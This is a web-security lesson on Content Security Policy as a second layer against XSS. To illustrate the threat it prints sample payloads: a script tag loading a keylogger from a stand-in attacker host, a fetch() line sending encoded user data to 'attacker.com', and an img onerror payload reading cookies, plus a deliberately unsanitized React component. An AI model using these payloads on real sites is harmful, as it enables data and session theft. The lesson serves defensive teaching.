💡 CI01.4.1: Defense in Depth: Intro to Content Security Policy

**Outline:**

- **The Threat (SEEI):** Relying on a single layer of defense. A single coding mistake can lead to a complete compromise.
- **The Defense (PPP):** Understanding Content Security Policy (CSP) as a powerful, browser-enforced second layer that acts as a safety net.
- **Your Mission (Production):** Explain how CSP would neutralize an otherwise successful XSS attack.

### 📘 Full Lesson Content

### Part 1: Presentation - The Threat (SEEI)

**What is it? (The Vulnerability):**

The vulnerability is a **fragile security model**. So far, we've focused on application-level defenses: meticulously encoding output, sanitizing HTML, and validating inputs. This is essential, but it's like having a single, very strong front door. If an attacker finds just one mistake—one forgotten encoding, one overlooked `dangerouslySetInnerHTML`—they are inside, and they have free rein. **Relying solely on your own code being perfect 100% of the time is the vulnerability.**

**How it Works (The Attack Vector):**

A developer accidentally introduces a small XSS flaw on a single page. The attacker discovers it and injects a payload.

```tsx
// A single mistake in a large application
const UserWidget = ({ data }) => {
    // The developer forgot to sanitize this one piece of data.
    return <div dangerouslySetInnerHTML={{ __html: data.legacyHTML }} />
}

// The attacker's payload is injected:
// <script src="<https://attacker-cdn.com/keylogger.js>"></script>

```

Because there is no second layer of defense, the moment the script is injected, the game is over. The browser will blindly fetch and execute `keylogger.js` from the attacker's server, compromising the user. The single point of failure led to a total breach.

### Part 2: Practice - The Defense (PPP)

**The Golden Rule:**

The principle of defense is **"Defense in Depth."** Assume that your primary defenses might one day fail. You need a safety net. **Content Security Policy (CSP)** is a browser security feature, delivered via an HTTP header, that acts as this safety net. You give the browser a strict allowlist of what is and is not allowed to happen on your page.

A CSP can tell the browser things like:

- "Only execute scripts that come from my own domain."
- "Only load images from my domain and my trusted CDN."
- "Do not allow any inline scripts or styles."
- "Only allow form submissions to my own backend."

**Secure Code Implementation (Conceptual):**

CSP isn't code you write in React; it's a rule you configure on your server. If the server sends the following HTTP header along with the page:

`Content-Security-Policy: script-src 'self';`

Now, let's revisit the attack scenario. The developer still makes the same mistake, and the malicious `<script>` tag is still injected into the page.

However, when the browser sees `<script src="<https://attacker-cdn.com/keylogger.js>">`, it first checks the CSP. The policy says `script-src 'self'`, meaning "only allow scripts from the same origin." Since `attacker-cdn.com` is not the same origin, the browser **refuses to load and execute the script.** The XSS attack is successfully neutralized by the second layer of defense, even though the application code was flawed.

### 🧠 Real-World Case Study: "Vulnerable App vs. Secured App"

**The Goal:** Prevent data exfiltration from an XSS attack.

- **Vulnerable App (No CSP):** An attacker finds an XSS flaw and injects a script: `<script>fetch('//attacker.com/steal?data=' + btoa(JSON.stringify(window.user_data)))</script>`.
    - **Result:** The script executes, grabs sensitive data from a global JavaScript variable, and successfully sends it to the attacker's server.
- **Secured App (with CSP):** The application has a CSP header: `Content-Security-Policy: script-src 'self'; connect-src 'self';`
    - **Result:** The attacker injects the same payload. The browser checks the CSP. The `connect-src 'self'` directive means "only allow API calls (like fetch) to my own domain." The browser sees the request to `attacker.com` violates the policy and **blocks the network request.** The XSS might still be present, but the damage (data theft) is prevented.

### 🤔 Reflective Questions

1. CSP is a powerful tool, but it's not a replacement for writing secure code. Why is it important to still fix the underlying XSS vulnerability even if you have a strong CSP in place?
2. How might a strict CSP affect the use of third-party analytics or advertising scripts on your website?

### 📚 Further Reading

- **MDN:** [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) - The ultimate guide to CSP.
- **Google Web Fundamentals:** [Content Security Policy](https://web.dev/articles/csp) - A great, practical introduction.

### 📝 Mini Task (Production)

An attacker has successfully injected the following payload into your site, which does not have a CSP: `<img src=x onerror="alert('Your session token is: ' + document.cookie)">`.

Your task: Explain which **two** CSP directives you could use to neutralize this specific attack. For each directive, explain _how_ it stops the attack.